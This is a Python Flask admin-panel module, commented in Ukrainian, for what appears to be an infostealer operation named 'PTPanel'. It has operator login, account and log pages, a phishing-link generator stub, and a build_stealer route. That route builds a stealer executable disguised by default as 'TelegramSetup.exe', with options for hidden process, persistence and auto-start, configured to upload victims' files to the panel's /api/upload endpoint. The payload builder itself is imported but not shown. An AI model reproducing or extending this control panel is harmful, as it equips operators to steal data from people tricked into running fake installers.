from flask import Blueprint, render_template, request, flash, redirect, url_for, session
from core.database import db_manager
from models.db_models import Admin
from core.security import verify_password, hash_password
import logging
from datetime import datetime

admin_bp = Blueprint('admin', __name__)
logger = logging.getLogger(__name__)

# Допоміжна функція для перевірки авторизації
def login_required(f):
    from functools import wraps
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_logged_in' not in session:
            flash('Будь ласка, увійдіть в систему', 'warning')
            return redirect(url_for('admin.admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# Допоміжна функція для перевірки головного адміна
def main_admin_required(f):
    from functools import wraps
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_username' not in session or session.get('admin_username') != 'admin':
            flash('Доступ заборонено. Потрібні права головного адміна', 'danger')
            return redirect(url_for('admin.admin_dashboard'))
        return f(*args, **kwargs)
    return decorated_function

@admin_bp.route('/login', methods=['GET', 'POST'])
def admin_login():
    """Форма входу в адмін-панель"""
    # Якщо вже авторизований - перенаправляємо на головну
    if 'admin_logged_in' in session:
        return redirect(url_for('admin.admin_dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # Перевірка в базі даних
        db_session = db_manager.get_session()
        try:
            admin = db_session.query(Admin).filter(Admin.username == username).first()
            
            if admin and verify_password(password, admin.password_hash) and admin.is_active:
                # Зберігаємо в сесії
                session['admin_logged_in'] = True
                session['admin_username'] = admin.username
                session['admin_id'] = admin.id
                session['is_main_admin'] = (admin.username == 'admin')
                
                # Оновлюємо last_login
                admin.last_login = datetime.utcnow()
                db_session.commit()
                
                flash(f'Вітаємо, {admin.username}! Успішний вхід в систему.', 'success')
                logger.info(f"Admin {admin.username} logged in")
                return redirect(url_for('admin.admin_dashboard'))
            else:
                flash('Невірний логін або пароль!', 'danger')
                logger.warning(f"Failed login attempt for username: {username}")
                
        except Exception as e:
            flash('Помилка сервера при авторизації', 'danger')
            logger.error(f"Login error: {e}")
        finally:
            db_session.close()
    
    return render_template('admin/login.html', app_name="PTPanel")

@admin_bp.route('/logout')
def admin_logout():
    """Вихід з системи"""
    username = session.get('admin_username', 'Unknown')
    session.clear()
    flash('Ви вийшли з системи', 'info')
    logger.info(f"Admin {username} logged out")
    return redirect(url_for('admin.admin_login'))

# Захищаємо всі маршрути необхідністю авторизації
@admin_bp.route('/')
@login_required
def admin_dashboard():
    """Головна сторінка адмінки"""
    return render_template('admin/dashboard.html', 
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')})

@admin_bp.route('/devices')
@login_required
def admin_devices():
    """Управління акаунтами"""
    return render_template('admin/devices.html',
                         app_name="PTPanel", 
                         current_user={'username': session.get('admin_username')})

@admin_bp.route('/stealer')
@login_required
def admin_stealer():
    """Stealer білдер"""
    return render_template('admin/stealer.html',
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')})

@admin_bp.route('/services')
@login_required
def admin_services():
    """Сервіси та білдер посилань"""
    return render_template('admin/services.html',
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')})

@admin_bp.route('/settings')
@login_required
def admin_settings():
    """Налаштування"""
    return render_template('admin/settings.html',
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')})

@admin_bp.route('/logs')
@login_required
@main_admin_required
def admin_logs():
    """Логи системи (тільки для головного адміна)"""
    return render_template('admin/logs.html',
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')},
                         is_main_admin=session.get('is_main_admin', False))

@admin_bp.route('/admins')
@login_required
@main_admin_required
def admin_admins():
    """Управління адмінами (тільки для головного адміна)"""
    return render_template('admin/admins.html',
                         app_name="PTPanel",
                         current_user={'username': session.get('admin_username')},
                         is_main_admin=session.get('is_main_admin', False))

# Додаткові маршрути для обробки форм
@admin_bp.route('/update_settings', methods=['POST'])
@login_required
def update_settings():
    """Оновлення налаштувань"""
    # Тут буде логіка оновлення налаштувань
    flash('Налаштування оновлено успішно!', 'success')
    return redirect(url_for('admin.admin_settings'))

@admin_bp.route('/add_account', methods=['POST'])
@login_required
def add_account():
    """Додавання нового акаунта"""
    # Тут буде логіка додавання акаунта
    flash('Акаунт успішно додано!', 'success')
    return redirect(url_for('admin.admin_devices'))

@admin_bp.route('/build_stealer', methods=['POST'])
@login_required
def build_stealer():
    """Побудова стіллера з відправкою файлів адміну"""
    try:
        # Отримуємо дані з форми
        filename = request.form.get('filename', 'TelegramSetup')
        admin_id = request.form.get('admin_id', session.get('admin_id'))
        features = request.form.getlist('features')
        auto_start = 'auto_start' in request.form
        hide_process = 'hide_process' in request.form
        persistence = 'persistence' in request.form
        
        # Логуємо інформацію про побудову
        logger.info(f"Building stealer for admin {session.get('admin_username')}")
        logger.info(f"Features: {features}")
        logger.info(f"Filename: {filename}.exe")
        logger.info(f"Target admin ID: {admin_id}")
        
        # Створюємо конфігурацію для стіллера
        stealer_config = {
            'server_url': f"{request.host_url}api/upload",
            'admin_id': admin_id,
            'target_admin': session.get('admin_username'),
            'features': features,
            'auto_start': auto_start,
            'hide_process': hide_process,
            'persistence': persistence,
            'version': '1.0.0'
        }
        
        # Викликаємо білдер стіллера
        from core.stealer_builder import stealer_builder
        output_path = f"client/dist/{filename}.exe"
        
        success = stealer_builder.build_stealer(stealer_config, output_path)
        
        if success:
            flash(f'Стіллер успішно збудовано! Файли будуть надсилатися на ваш акаунт.', 'success')
            logger.info(f"Stealer built successfully: {output_path}")
        else:
            flash('Помилка при побудові стіллера', 'danger')
            logger.error("Stealer build failed")
            
    except Exception as e:
        flash(f'Помилка при побудові стіллера: {str(e)}', 'danger')
        logger.error(f"Stealer build error: {e}")
    
    return redirect(url_for('admin.admin_stealer'))

@admin_bp.route('/generate_link', methods=['POST'])
@login_required
def generate_link():
    """Генерація унікального посилання"""
    # Тут буде логіка генерації посилань
    flash('Посилання успішно згенеровано!', 'success')
    return redirect(url_for('admin.admin_services'))